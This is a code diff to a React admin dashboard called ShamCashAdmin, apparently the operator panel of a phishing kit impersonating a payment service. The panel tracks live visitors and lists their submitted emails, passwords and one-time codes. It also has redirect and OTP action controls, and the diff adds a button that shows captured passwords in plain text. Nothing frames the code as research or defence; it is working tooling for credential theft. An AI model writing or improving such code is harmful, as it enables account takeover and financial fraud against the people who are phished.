@@ -98,6 +98,7 @@ export function ShamCashAdmin({ onLogout }: { onLogout?: () => void }) {
   const [liveStatus, setLiveStatus] = useState<VisitorStatus>("disconnected");
   const [liveId, setLiveId] = useState<string | null>(null);
   const [showRedirect, setShowRedirect] = useState(false);
+  const [showPassword, setShowPassword] = useState(false);
   const [hasNew, setHasNew] = useState(false);
   const prevLiveId = useRef<string | null>(null);
   const prevLiveStatus = useRef<VisitorStatus>("disconnected");
@@ -330,7 +331,7 @@ export function ShamCashAdmin({ onLogout }: { onLogout?: () => void }) {
               const timeDiff = Date.now() - sub.submittedAtTs;
               const timeAgo = timeDiff < 60000 ? "الآن" : timeDiff < 3600000 ? `${Math.floor(timeDiff / 60000)} د` : `${Math.floor(timeDiff / 3600000)} س`;
               return (
-                <button key={sub.id} onClick={() => { setSelected(sub.id); setHasNew(false); }}
+                <button key={sub.id} onClick={() => { setSelected(sub.id); setHasNew(false); setShowPassword(false); }}
                   className={`w-full rounded-[12px] border p-3 text-right transition-all duration-150 ${isSelected
                     ? "bg-[#1a2a55] border-[#657bd8]/50 shadow-[0_0_12px_rgba(101,123,216,0.15)]"
                     : "bg-[#121d35] border-[#1e2a45] hover:bg-[#162038] hover:border-[#2a3a5a]"
@@ -510,20 +511,41 @@ export function ShamCashAdmin({ onLogout }: { onLogout?: () => void }) {
                 <div className="p-4 space-y-3">
                   {/* Credentials */}
                   <div className="grid grid-cols-1 gap-2">
-                    {[
-                      { label: T.email, value: selectedSub.email, icon: <Mail className="h-3 w-3" />, dir: "ltr" },
-                      { label: T.password, value: selectedSub.password ? "••••••••" : T.notSubmitted, icon: <KeyRound className="h-3 w-3" />, dir: "ltr" },
-                      { label: T.otpCode, value: selectedSub.otpCode || T.waiting, icon: <ShieldCheck className="h-3 w-3" />, dir: "ltr", highlight: !!selectedSub.otpCode },
-                    ].map((row) => (
-                      <div key={row.label} className={`flex items-center justify-between rounded-[9px] px-3 py-2.5 ${row.highlight ? "bg-[#f5a623]/10 border border-[#f5a623]/20" : "bg-[#0d1526] border border-[#1e2a45]"}`}>
-                        <span className={`text-[10px] font-semibold flex items-center gap-1.5 ${row.highlight ? "text-[#f5a623]/70" : "text-white/35"}`}>
-                          {row.icon}{row.label}
+                    {/* Email row */}
+                    <div className="flex items-center justify-between rounded-[9px] px-3 py-2.5 bg-[#0d1526] border border-[#1e2a45]">
+                      <span className="text-[10px] font-semibold flex items-center gap-1.5 text-white/35">
+                        <Mail className="h-3 w-3" />{T.email}
+                      </span>
+                      <span className="text-[12px] font-bold text-white/80" dir="ltr">{selectedSub.email || "—"}</span>
+                    </div>
+                    {/* Password row with eye toggle */}
+                    <div className="flex items-center justify-between rounded-[9px] px-3 py-2.5 bg-[#0d1526] border border-[#1e2a45]">
+                      <span className="text-[10px] font-semibold flex items-center gap-1.5 text-white/35">
+                        <KeyRound className="h-3 w-3" />{T.password}
+                      </span>
+                      <div className="flex items-center gap-2">
+                        <span className={`text-[12px] font-bold ${selectedSub.password ? (showPassword ? "text-[#f5a623]" : "text-white/80") : "text-white/25"}`} dir="ltr">
+                          {selectedSub.password ? (showPassword ? selectedSub.password : "••••••••") : T.notSubmitted}
                         </span>
-                        <span className={`text-[12px] font-bold ${row.highlight ? "text-[#f5a623]" : row.value === T.waiting || row.value === T.notSubmitted ? "text-white/25" : "text-white/80"}`} dir={row.dir}>
-                          {row.value || "—"}
-                        </span>
+                        {selectedSub.password && (
+                          <button onClick={() => setShowPassword(!showPassword)} className="text-white/30 hover:text-white/70 transition-colors">
+                            {showPassword
+                              ? <svg viewBox="0 0 24 24" fill="none" className="h-3.5 w-3.5" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
+                              : <svg viewBox="0 0 24 24" fill="none" className="h-3.5 w-3.5" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+                            }
+                          </button>
+                        )}
                       </div>
-                    ))}
+                    </div>
+                    {/* OTP row */}
+                    <div className={`flex items-center justify-between rounded-[9px] px-3 py-2.5 ${selectedSub.otpCode ? "bg-[#f5a623]/10 border border-[#f5a623]/20" : "bg-[#0d1526] border border-[#1e2a45]"}`}>
+                      <span className={`text-[10px] font-semibold flex items-center gap-1.5 ${selectedSub.otpCode ? "text-[#f5a623]/70" : "text-white/35"}`}>
+                        <ShieldCheck className="h-3 w-3" />{T.otpCode}
+                      </span>
+                      <span className={`text-[12px] font-bold ${selectedSub.otpCode ? "text-[#f5a623]" : "text-white/25"}`} dir="ltr">
+                        {selectedSub.otpCode || T.waiting}
+                      </span>
+                    </div>
                   </div>
 
                   {/* OTP Action Buttons */}
